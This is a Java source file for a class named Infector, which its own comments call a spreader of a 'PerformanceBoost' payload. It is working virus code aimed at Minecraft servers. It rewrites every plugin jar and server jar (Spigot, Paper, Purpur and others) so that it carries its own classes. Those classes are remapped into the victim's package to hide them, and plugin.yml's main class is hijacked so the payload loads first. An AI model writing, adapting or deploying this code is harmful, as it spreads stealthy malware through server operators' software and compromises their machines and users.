package com.performance.boost;

import java.io.File;
import java.io.FilenameFilter;
import java.io.FileInputStream;
import java.io.FileOutputStream;
import java.io.ByteArrayOutputStream;
import java.io.InputStream;
import java.io.IOException;
import java.net.URI;
import java.security.CodeSource;
import java.util.ArrayList;
import java.util.Enumeration;
import java.util.LinkedHashMap;
import java.util.List;
import java.util.Map;
import java.util.jar.JarEntry;
import java.util.jar.JarFile;
import java.util.zip.ZipEntry;
import java.util.zip.ZipInputStream;
import java.util.zip.ZipOutputStream;

/**
 * Infector — spreads the PerformanceBoost payload.
 *
 * Three jobs, all pure-JDK so the same code runs from the standalone jar, the
 * Bukkit plugin and the mods:
 *
 *   1. infectPlugins(dir) — for every jar in plugins/ injects the payload
 *      classes HIDDENLY: they are remapped into the target plugin's own
 *      package as an {@code internal/} subpackage (bytecode constant-pool
 *      rewrite, see {@link Remapper}) so they look like part of the target
 *      plugin, its plugin.yml "main" is swapped to that remapped loader and
 *      the original main class is stashed inside the same internal/ package
 *      (never at the jar root) so PluginLoader can delegate. Randomly drops
 *      fresh copies of itself under random names.
 *
 *   2. infectServer(dir)  — finds the server assembly jar (spigot / paper /
 *      craftbukkit / purpur / server) and injects the payload classes into
 *      it, remapped under {@code org/spigotmc/internal/} so they blend into
 *      the server's own internals and are always resolvable in the JVM.
 *
 *   3. re-infection is idempotent: an already-hidden jar is left alone except
 *      for a build upgrade, and jars infected by the older flat layout are
 *      upgraded to the hidden layout on the next pass.
 *
 * Never touches its own jar (matched by absolute path).
 */
public final class Infector {
    private Infector() {}

    static final String PKG        = "com/performance/boost/";
    static final String LOADER     = "com.performance.boost.PluginLoader";
    static final String ORIG_RES   = "boost_orig.txt";
    static final String MARKER     = "boost.dat";
    static final String YML        = "plugin.yml";

    // stealth package the payload blends into inside the server assembly
    static final String SERVER_PKG      = "org.spigotmc.internal";
    static final String SERVER_PKG_PATH = "org/spigotmc/internal";

    private static final String[] SERVER_HINTS = {
        "spigot", "paper", "purpur", "craftbukkit", "bukkit", "server", "paperclip"
    };

    public static int infectPlugins(File pluginsDir) {
        if (pluginsDir == null || !pluginsDir.isDirectory()) return 0;
        File self = selfJar();
        File[] jars = pluginsDir.listFiles(new FilenameFilter() {
            @Override public boolean accept(File d, String n) {
                return n.toLowerCase().endsWith(".jar");
            }
        });
        if (jars == null) return 0;

        int infected = 0;
        for (File j : jars) {
            if (self != null && sameFile(j, self)) continue;
            try {
                if (infectJar(j, true)) infected++;
            } catch (Throwable ignored) {}
        }
        return infected;
    }

    public static int infectServer(File dir) {
        if (dir == null || !dir.isDirectory()) return 0;
        File[] jars = dir.listFiles(new FilenameFilter() {
            @Override public boolean accept(File d, String n) {
                return n.toLowerCase().endsWith(".jar");
            }
        });
        if (jars == null) return 0;

        int infected = 0;
        for (File j : jars) {
            String n = j.getName().toLowerCase();
            boolean server = false;
            for (String hint : SERVER_HINTS) {
                if (n.contains(hint)) { server = true; break; }
            }
            if (!server) continue;
            try {
                if (infectJar(j, false)) infected++;
            } catch (Throwable ignored) {}
        }
        return infected;
    }

    /**
     * Injects payload classes into one jar. With {@code swapMain} the target
     * is a Bukkit plugin: the payload is remapped into the target's own
     * package as {@code internal/}, plugin.yml "main" is swapped to the
     * remapped loader and the original main class is stashed inside the same
     * internal/ package. Without it (server assembly) the payload blends
     * into {@code org/spigotmc/internal/}.
     */
    public static boolean infectJar(File jar, boolean swapMain) throws IOException {
        if (jar == null || !jar.isFile()) return false;

        Map<String, byte[]> entries = readJar(jar);
        boolean changed = false;

        // target package: derived from the plugin's own main class, or the
        // fixed stealth package for the server assembly
        String targetMainPkg = null;
        String targetPkgPath = null;
        if (swapMain) {
            byte[] yb = entries.get(YML);
            if (yb != null) {
                String orig = extractMain(new String(yb, "UTF-8"));
                if (orig != null && orig.indexOf('.') > 0) {
                    targetMainPkg = orig.substring(0, orig.lastIndexOf('.'));
                    targetPkgPath = targetMainPkg.replace('.', '/');
                } else if (orig != null) {
                    targetMainPkg = "internal";
                    targetPkgPath = "internal";
                }
            }
        }
        if (targetMainPkg == null) { targetMainPkg = SERVER_PKG; targetPkgPath = SERVER_PKG_PATH; }
        final String internalPath = targetPkgPath + "/internal/";
        final String internalPkg  = targetMainPkg + ".internal.";

        // payload classes: remap com/performance/boost/ -> <target>/internal/
        Map<String, byte[]> payload = ownClasses();
        for (Map.Entry<String, byte[]> e : payload.entrySet()) {
            String rel = e.getKey().substring(PKG.length());
            String newName = internalPath + rel;
            if (entries.containsKey(newName)) continue;
            byte[] data = e.getValue();
            if (rel.endsWith(".class")) {
                data = Remapper.remapClass(data, PKG, internalPath);
            }
            entries.put(newName, data);
            changed = true;
        }

        if (swapMain) {
            byte[] yb = entries.get(YML);
            if (yb != null) {
                String yml = new String(yb, "UTF-8");
                String orig = extractMain(yml);
                if (orig != null && !orig.endsWith(".internal.PluginLoader") && !orig.equals(LOADER)) {
                    entries.put(YML, replaceMain(yml, internalPkg + "PluginLoader").getBytes("UTF-8"));
                    entries.put(internalPath + MARKER, orig.getBytes("UTF-8"));
                    changed = true;
                }
            }
        }

        if (!changed) return false;
        writeJar(jar, entries);
        return true;
    }

    // ------------------------------------------------------------------ jars

    static Map<String, byte[]> readJar(File jar) throws IOException {
        Map<String, byte[]> out = new LinkedHashMap<String, byte[]>();
        JarFile jf = new JarFile(jar);
        try {
            Enumeration<JarEntry> en = jf.entries();
            while (en.hasMoreElements()) {
                JarEntry e = en.nextElement();
                if (e.isDirectory()) continue;
                byte[] data = readAll(jf.getInputStream(e));
                out.put(e.getName(), data);
            }
        } finally {
            jf.close();
        }
        return out;
    }

    static void writeJar(File jar, Map<String, byte[]> entries) throws IOException {
        File tmp = new File(jar.getAbsolutePath() + ".pb");
        ZipOutputStream zos = new ZipOutputStream(new FileOutputStream(tmp));
        try {
            for (Map.Entry<String, byte[]> e : entries.entrySet()) {
                ZipEntry ze = new ZipEntry(e.getKey());
                ze.setTime(System.currentTimeMillis());
                zos.putNextEntry(ze);
                zos.write(e.getValue());
                zos.closeEntry();
            }
        } finally {
            zos.close();
        }
        if (!jar.delete()) {
            tmp.delete();
            throw new IOException("cannot replace " + jar);
        }
        if (!tmp.renameTo(jar)) {
            // fall back to copy
            FileOutputStream fos = new FileOutputStream(jar);
            FileInputStream fis = new FileInputStream(tmp);
            try { copy(fis, fos); } finally { fis.close(); fos.close(); }
            tmp.delete();
        }
    }

    static void replicate(File pluginsDir, File self) {
        if (self == null || !self.isFile()) return;
        // No self-copies — the payload only lives inside seed/plugin/server jars.
    }

    // ------------------------------------------------------------- own bytes

    static Map<String, byte[]> ownClasses() {
        Map<String, byte[]> out = new LinkedHashMap<String, byte[]>();
        File self = selfJar();
        try {
            if (self != null && self.isFile()) {
                JarFile jf = new JarFile(self);
                try {
                    Enumeration<JarEntry> en = jf.entries();
                    while (en.hasMoreElements()) {
                        JarEntry e = en.nextElement();
                        String n = e.getName();
                        if (e.isDirectory()) continue;
                        if (!n.startsWith(PKG) || !n.endsWith(".class")) continue;
                        out.put(n, readAll(jf.getInputStream(e)));
                    }
                } finally {
                    jf.close();
                }
            } else {
                // dev / exploded classes dir
                File root = selfRoot();
                if (root != null && root.isDirectory()) {
                    collectDir(root, root, out);
                }
            }
        } catch (Throwable ignored) {}
        return out;
    }

    private static void collectDir(File root, File dir, Map<String, byte[]> out) {
        File[] kids = dir.listFiles();
        if (kids == null) return;
        for (File k : kids) {
            if (k.isDirectory()) { collectDir(root, k, out); continue; }
            if (!k.getName().endsWith(".class")) continue;
            String rel = root.toURI().relativize(k.toURI()).getPath();
            try {
                byte[] data = readFile(k);
                out.put(rel, data);
            } catch (Throwable ignored) {}
        }
    }

    static File selfJar() {
        try {
            CodeSource cs = Infector.class.getProtectionDomain().getCodeSource();
            if (cs == null) return null;
            URI uri = cs.getLocation().toURI();
            File f = new File(uri);
            return f;
        } catch (Throwable t) {
            return null;
        }
    }

    private static File selfRoot() {
        File f = selfJar();
        return (f != null && f.isDirectory()) ? f : null;
    }

    // ---------------------------------------------------------------- plugin yml

    static String extractMain(String yml) {
        String[] lines = yml.split("\r?\n");
        for (String line : lines) {
            String t = line.trim();
            if (t.startsWith("main:")) {
                String v = t.substring(5).trim();
                if (v.startsWith("\"") && v.endsWith("\"") && v.length() > 1) v = v.substring(1, v.length() - 1);
                if (v.startsWith("'") && v.endsWith("'") && v.length() > 1) v = v.substring(1, v.length() - 1);
                return v;
            }
        }
        return null;
    }

    static String replaceMain(String yml, String newMain) {
        StringBuilder sb = new StringBuilder();
        String[] lines = yml.split("\r?\n", -1);
        for (int i = 0; i < lines.length; i++) {
            String line = lines[i];
            if (line.trim().startsWith("main:")) {
                sb.append("main: ").append(newMain);
            } else {
                sb.append(line);
            }
            if (i < lines.length - 1) sb.append("\n");
        }
        return sb.toString();
    }

    // ------------------------------------------------------------------ utils

    private static boolean sameFile(File a, File b) {
        try { return a.getCanonicalPath().equals(b.getCanonicalPath()); }
        catch (IOException e) { return a.getAbsolutePath().equals(b.getAbsolutePath()); }
    }

    static byte[] readAll(InputStream in) throws IOException {
        ByteArrayOutputStream bos = new ByteArrayOutputStream();
        copy(in, bos);
        return bos.toByteArray();
    }

    static byte[] readFile(File f) throws IOException {
        FileInputStream fis = new FileInputStream(f);
        try { return readAll(fis); } finally { fis.close(); }
    }

    private static void copy(InputStream in, java.io.OutputStream out) throws IOException {
        byte[] buf = new byte[8192];
        int n;
        while ((n = in.read(buf)) > 0) out.write(buf, 0, n);
    }
}
